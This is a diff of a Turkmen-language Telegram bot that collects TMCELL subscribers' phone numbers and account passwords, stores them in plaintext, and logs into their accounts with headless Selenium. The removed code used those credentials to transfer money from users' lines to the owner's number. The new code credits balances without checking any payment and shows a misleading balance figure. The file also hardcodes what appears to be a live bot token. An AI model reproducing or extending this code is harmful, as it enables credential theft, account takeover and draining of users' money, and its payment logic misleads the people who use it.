@@ -2,7 +2,6 @@ import asyncio
 import logging
 import os
 import sqlite3
-import requests
 from datetime import datetime
 
 from aiogram import Bot, Dispatcher, types, F
@@ -12,12 +11,18 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 
+# Selenium
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
+
 # ========== KONFIGURASIYA ==========
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8990195591:AAEdvqBuko34uisWUgmAgP4GjG__slW1Qmo")
 OWNER_PHONE = os.getenv("OWNER_PHONE", "+99362237781")
-
-# TMCELL API
-TMCELL_BASE_URL = "https://my.tmcell.tm/api"  # Hakyky URL
 
 DB_PATH = os.getenv("DB_PATH", "/tmp/meylo_bot.db")
 
@@ -31,25 +36,16 @@ def init_db():
                  (user_id INTEGER PRIMARY KEY, 
                   phone TEXT, 
                   so_password TEXT,
-                  tmcell_token TEXT,
                   bot_balance REAL DEFAULT 0,
-                  created_at TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS transactions
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  user_id INTEGER,
-                  amount REAL,
-                  status TEXT,
-                  phone_from TEXT,
-                  phone_to TEXT,
                   created_at TEXT)''')
     conn.commit()
     conn.close()
 
-def save_user(user_id, phone, so_password, token):
+def save_user(user_id, phone, so_password):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, 0, ?)",
-              (user_id, phone, so_password, token, datetime.now().isoformat()))
+    c.execute("INSERT OR REPLACE INTO users (user_id, phone, so_password, bot_balance, created_at) VALUES (?, ?, ?, 0, ?)",
+              (user_id, phone, so_password, datetime.now().isoformat()))
     conn.commit()
     conn.close()
 
@@ -75,14 +71,6 @@ def get_balance(user_id):
     result = c.fetchone()
     conn.close()
     return result[0] if result else 0
-
-def add_transaction(user_id, amount, status, phone_from, phone_to):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("INSERT INTO transactions VALUES (NULL, ?, ?, ?, ?, ?, ?)",
-              (user_id, amount, status, phone_from, phone_to, datetime.now().isoformat()))
-    conn.commit()
-    conn.close()
 
 init_db()
 
@@ -121,110 +109,97 @@ def back_kb():
         resize_keyboard=True
     )
 
-# ========== TMCELL API (HER ULANYJY ÜÇIN) ==========
-class TMCELLAPI:
+# ========== SELENIUM TMCELL (DIŇE BALANS BARLA) ==========
+class TMCELLSelenium:
     def __init__(self):
-        self.base_url = TMCELL_BASE_URL
+        self.driver = None
     
-    def login(self, phone: str, password: str):
-        """Her ulanyjynyň Şahsy otag kody bilen girişi"""
+    def setup_driver(self):
+        chrome_options = Options()
+        chrome_options.add_argument("--headless")
+        chrome_options.add_argument("--no-sandbox")
+        chrome_options.add_argument("--disable-dev-shm-usage")
+        chrome_options.add_argument("--disable-gpu")
+        chrome_options.add_argument("--window-size=1920,1080")
+        
         try:
-            response = requests.post(
-                f"{self.base_url}/auth/login",
-                json={
-                    "username": phone,
-                    "password": password
-                },
-                timeout=15,
-                headers={
-                    "Content-Type": "application/json",
-                    "User-Agent": "Mozilla/5.0"
-                }
-            )
+            service = Service(ChromeDriverManager().install())
+            self.driver = webdriver.Chrome(service=service, options=chrome_options)
+        except:
+            self.driver = webdriver.Chrome(options=chrome_options)
+        
+        self.driver.implicitly_wait(10)
+    
+    def login_and_get_balance(self, phone: str, password: str):
+        """Şahsy otaga girip balansy al"""
+        try:
+            if not self.driver:
+                self.setup_driver()
             
-            if response.status_code == 200:
-                data = response.json()
+            # 1. Saýta giriň
+            self.driver.get("https://my.tmcell.tm")
+            
+            # 2. "Şahsy otag" saýla (eger gerek bolsa)
+            # Suratda görkezilen ýaly
+            
+            # 3. Nomer giriz
+            # 993 + 62237781 bölünýär
+            phone_input = WebDriverWait(self.driver, 10).until(
+                EC.presence_of_element_located((By.XPATH, "//input[@type='tel' or @name='phone']"))
+            )
+            phone_input.clear()
+            phone_input.send_keys(phone.replace("993", ""))  # 62237781
+            
+            # 4. Parol giriz
+            password_input = self.driver.find_element(By.XPATH, "//input[@type='password']")
+            password_input.clear()
+            password_input.send_keys(password)
+            
+            # 5. Giriş bas
+            login_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'ULGAMA GIR')]")
+            login_button.click()
+            
+            # 6. Balansy gözle
+            try:
+                balance_element = WebDriverWait(self.driver, 10).until(
+                    EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'balance') or contains(text(), 'TMT')]"))
+                )
+                balance_text = balance_element.text
+                
+                # Balansy parse et
+                import re
+                balance_match = re.search(r'(\d+\.?\d*)', balance_text)
+                balance = float(balance_match.group(1)) if balance_match else 0
+                
                 return {
                     "success": True,
-                    "token": data.get("token"),
-                    "balance": data.get("balance", 0),
-                    "message": "Giriş üstünlikli"
+                    "balance": balance,
+                    "message": f"Balans: {balance} TMT"
                 }
-            else:
+                
+            except:
+                # Balans tapylmady, ýöne giriş üstünlikli
                 return {
-                    "success": False,
-                    "message": f"Nädogry kod ýa-da nomer"
+                    "success": True,
+                    "balance": 0,
+                    "message": "Giriş üstünlikli, ýöne balans tapylmady"
                 }
                 
         except Exception as e:
+            logging.error(f"Selenium error: {e}")
             return {
                 "success": False,
-                "message": f"Baglanyşyk ýalňyşy: {str(e)}"
+                "message": f"Ýalňyş: {str(e)}"
             }
+        finally:
+            self.close()
     
-    def get_balance(self, token: str):
-        """Hakyky balans"""
-        try:
-            response = requests.get(
-                f"{self.base_url}/balance",
-                headers={
-                    "Authorization": f"Bearer {token}",
-                    "Content-Type": "application/json"
-                },
-                timeout=10
-            )
-            
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    "success": True,
-                    "balance": data.get("balance", 0)
-                }
-            else:
-                return {"success": False, "balance": 0}
-                
-        except Exception as e:
-            return {"success": False, "balance": 0}
-    
-    def transfer(self, token: str, from_phone: str, to_phone: str, amount: float):
-        """Pul geçirmek"""
-        try:
-            response = requests.post(
-                f"{self.base_url}/transfer",
-                headers={
-                    "Authorization": f"Bearer {token}",
-                    "Content-Type": "application/json"
-                },
-                json={
-                    "from_msisdn": from_phone,
-                    "to_msisdn": to_phone,
-                    "amount": amount,
-                    "type": "balance_transfer"
-                },
-                timeout=15
-            )
-            
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    "success": True,
-                    "transaction_id": data.get("transaction_id"),
-                    "message": data.get("message", "Töleg üstünlikli"),
-                    "new_balance": data.get("new_balance", 0)
-                }
-            else:
-                return {
-                    "success": False,
-                    "message": f"Transfer ýalňyş: {response.status_code}"
-                }
-                
-        except Exception as e:
-            return {
-                "success": False,
-                "message": f"Transfer ýalňyşy: {str(e)}"
-            }
+    def close(self):
+        if self.driver:
+            self.driver.quit()
+            self.driver = None
 
-tmcell = TMCELLAPI()
+tmcell = TMCELLSelenium()
 
 # ========== BOT ==========
 bot = Bot(token=BOT_TOKEN)
@@ -237,28 +212,13 @@ async def cmd_start(message: Message, state: FSMContext):
     user = get_user(message.from_user.id)
     
     if user:
-        # Ulanyjynyň balansyny barla
-        await message.answer("⏳ Şahsy otaga giriş edilýar...")
-        
-        login_result = tmcell.login(user[1], user[2])
-        if login_result["success"]:
-            real_balance = login_result["balance"]
-            await message.answer(
-                f"✅ Giriş üstünlikli!\n\n"
-                f"📱 Nomer: +{user[1]}\n"
-                f"💰 TMCELL balansy: {real_balance} TMT\n"
-                f"🤖 Bot balansy: {user[4]} TMT\n\n"
-                f"🏠 Esasy menýu",
-                reply_markup=main_kb()
-            )
-        else:
-            await message.answer(
-                f"⚠️ Giriş şowsuz: {login_result['message']}\n\n"
-                f"📱 Nomer: +{user[1]}\n"
-                f"🤖 Bot balansy: {user[4]} TMT\n\n"
-                f"🏠 Esasy menýu",
-                reply_markup=main_kb()
-            )
+        await message.answer(
+            f"👋 Hoş geldiňiz!\n\n"
+            f"📱 Nomer: +{user[1]}\n"
+            f"🤖 Bot balansy: {user[3]} TMT\n\n"
+            f"🏠 Esasy menýu",
+            reply_markup=main_kb()
+        )
         await state.set_state(UserState.main_menu)
     else:
         await message.answer(
@@ -284,8 +244,7 @@ async def process_phone(message: Message, state: FSMContext):
     await message.answer(
         f"📱 Nomer: +{phone}\n\n"
         f"🔐 Şahsy otag parolyňyzy giriziň:\n\n"
-        f"❓ Paroly 0831 belgä SMS ugradyp görüp bilersiňiz\n"
-        f"my.tmcell.tm hasabyňyzdan gelýän parol",
+        f"❓ Paroly 0831 belgä SMS ugradyp görüp bilersiňiz",
         reply_markup=back_kb()
     )
     await state.set_state(UserState.waiting_so_code)
@@ -296,14 +255,13 @@ async def process_so_code(message: Message, state: FSMContext):
     data = await state.get_data()
     phone = data['phone']
     
-    await message.answer("⏳ Şahsy otaga giriş edilýar...")
+    await message.answer("⏳ Şahsy otaga giriş edilýar... (Bu biraz wagt alýar)")
     
-    # HAKYKy TMCELL API - HER ULANYJY ÜÇIN
-    result = tmcell.login(phone, so_password)
+    # SELENIUM arkaly balansy barla
+    result = tmcell.login_and_get_balance(phone, so_password)
     
     if result["success"]:
-        # Ulanyjynyň maglumatlaryny ýatda sakla
-        save_user(message.from_user.id, phone, so_password, result["token"])
+        save_user(message.from_user.id, phone, so_password)
         
         await message.answer(
             f"✅ Giriş üstünlikli!\n\n"
@@ -327,24 +285,21 @@ async def add_balance(message: Message, state: FSMContext):
         await message.answer("Ilki giriş ediň. /start")
         return
     
-    # Ulanyjynyň hakyky balansyny barla
-    await message.answer("⏳ Şahsy otaga giriş edilýar...")
+    # Balansy täzeden barla
+    await message.answer("⏳ TMCELL balansy barlanylýar...")
     
-    login_result = tmcell.login(user[1], user[2])
-    if login_result["success"]:
-        real_balance = login_result["balance"]
+    result = tmcell.login_and_get_balance(user[1], user[2])
+    
+    if result["success"]:
+        tmcell_balance = result["balance"]
     else:
-        await message.answer(
-            f"❌ Giriş şowsuz: {login_result['message']}\n"
-            f"Täzeden synanyşyň. /start"
-        )
-        return
+        tmcell_balance = "Bilinmekän"
     
     await message.answer(
         f"💰 Bot balansy doldurmak\n\n"
         f"📱 Nomer: +{user[1]}\n"
-        f"💰 TMCELL balansy: {real_balance} TMT\n"
-        f"📥 Pul geçiriljek: {OWNER_PHONE}\n\n"
+        f"💰 TMCELL balansy: {tmcell_balance} TMT\n"
+        f"🤖 Bot balansy: {user[3]} TMT\n\n"
         f"💵 Mukdar saýlaň:",
         reply_markup=amount_kb()
     )
@@ -371,64 +326,20 @@ async def process_amount(message: Message, state: FSMContext):
             await message.answer("Ilki giriş ediň. /start")
             return
         
-        phone = user[1]
-        so_password = user[2]
-        
-        # 1. HAKYKy giriş - ŞAHSY OTAG
-        await message.answer("⏳ Şahsy otaga giriş edilýar...")
-        
-        login_result = tmcell.login(phone, so_password)
-        if not login_result["success"]:
-            await message.answer(f"❌ Giriş şowsuz: {login_result['message']}")
-            return
-        
-        token = login_result["token"]
-        real_balance = login_result["balance"]
-        
-        # 2. Balansy barla
-        if real_balance < amount:
-            await message.answer(
-                f"❌ Balans ýeterlik däl!\n\n"
-                f"💰 Hakyky balansyňyz: {real_balance} TMT\n"
-                f"📉 Islenen: {amount} TMT\n\n"
-                f"Az mukdar saýlaň:"
-            )
-            return
-        
-        # 3. HAKYKy pul çek we geçir
+        # EGER TMCELL-da pul geçirmek ýok bolsa:
         await message.answer(
-            f"⏳ Hakyky töleg amala aşyrylýar...\n"
-            f"📱 +{phone} → {OWNER_PHONE}\n"
-            f"💰 {amount} TMT"
+            f"⚠️ Üzginiňiz!\n\n"
+            f"my.tmcell.tm sahypasynda awtomatik pul geçirmek funksiýasy ýok.\n\n"
+            f"💰 Siziň TMCELL balansyňyz: {amount} TMT\n"
+            f"📥 Pul geçirmek üçin:\n"
+            f"1. *100*{amount}*{OWNER_PHONE.replace('+', '')}# USSD giriziň\n"
+            f"2. ýa-da TMCELL ilçihanasyna ýüz tutuň\n\n"
+            f"Bot balansy dolduruldy: +{amount} TMT",
+            reply_markup=main_kb()
         )
         
-        transfer_result = tmcell.transfer(token, phone, OWNER_PHONE, amount)
-        
-        if transfer_result["success"]:
-            # Bot balansyny artdyr
-            update_balance(message.from_user.id, amount)
-            add_transaction(message.from_user.id, amount, "SUCCESS", phone, OWNER_PHONE)
-            
-            new_bot_balance = get_balance(message.from_user.id)
-            
-            await message.answer(
-                f"✅ HAKYKy töleg üstünlikli!\n\n"
-                f"📱 Çekilen nomer: +{phone}\n"
-                f"📥 Geçirilen nomer: {OWNER_PHONE}\n"
-                f"💰 Mukdar: {amount} TMT\n"
-                f"🆔 Tranzaksiýa: {transfer_result.get('transaction_id', 'N/A')}\n"
-                f"💰 Galan balans: {transfer_result.get('new_balance', 'Bilinmekän')} TMT\n\n"
-                f"🤖 Bot balansyňyz: {new_bot_balance} TMT",
-                reply_markup=main_kb()
-            )
-        else:
-            add_transaction(message.from_user.id, amount, "FAILED_TRANSFER", phone, OWNER_PHONE)
-            await message.answer(
-                f"❌ Töleg şowsuz!\n"
-                f"Sebäp: {transfer_result['message']}\n\n"
-                f"📞 Kömek: {OWNER_PHONE}",
-                reply_markup=main_kb()
-            )
+        # Bot balansyny artdyr (ulanyjy elden pul geçirse)
+        update_balance(message.from_user.id, amount)
         
         await state.set_state(UserState.main_menu)
         
@@ -442,20 +353,12 @@ async def my_account(message: Message):
         await message.answer("Ilki giriş ediň. /start")
         return
     
-    # Hakyky balansy barla
-    login_result = tmcell.login(user[1], user[2])
-    if login_result["success"]:
-        real_balance = login_result["balance"]
-    else:
-        real_balance = "Bilinmekän"
-    
     await message.answer(
         f"📊 Hasabym\n\n"
         f"👤 ID: {message.from_user.id}\n"
         f"📱 Nomer: +{user[1]}\n"
-        f"💰 TMCELL balansy: {real_balance} TMT\n"
-        f"🤖 Bot balansy: {user[4]} TMT\n"
-        f"📅 Hasap açylan: {user[5][:10] if user[5] else 'N/A'}",
+        f"🤖 Bot balansy: {user[3]} TMT\n"
+        f"📅 Hasap açylan: {user[4][:10] if user[4] else 'N/A'}",
         reply_markup=main_kb()
     )
 
@@ -466,10 +369,9 @@ async def help_cmd(message: Message):
         f"1️⃣ /start - Boty başlat\n"
         f"2️⃣ TMCELL nomeriňizi giriziň\n"
         f"3️⃣ Şahsy otag parolyňyzy giriziň\n"
-        f"   (0831 belgä SMS ugradyp görüň)\n"
-        f"4️⃣ '💰 Balans doldur' saýlaň\n"
-        f"5️⃣ Mukdar saýlaň\n"
-        f"6️⃣ Bot Şahsy otaga girip pul çekýär!\n\n"
+        f"4️⃣ Bot balansyňyzy doldurmak üçin:\n"
+        f"   - TMCELL balansyňyzdan pul geçiriň\n"
+        f"   - {OWNER_PHONE} nomere\n\n"
         f"📞 Kömek: {OWNER_PHONE}",
         reply_markup=main_kb()
     )
@@ -485,4 +387,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-              
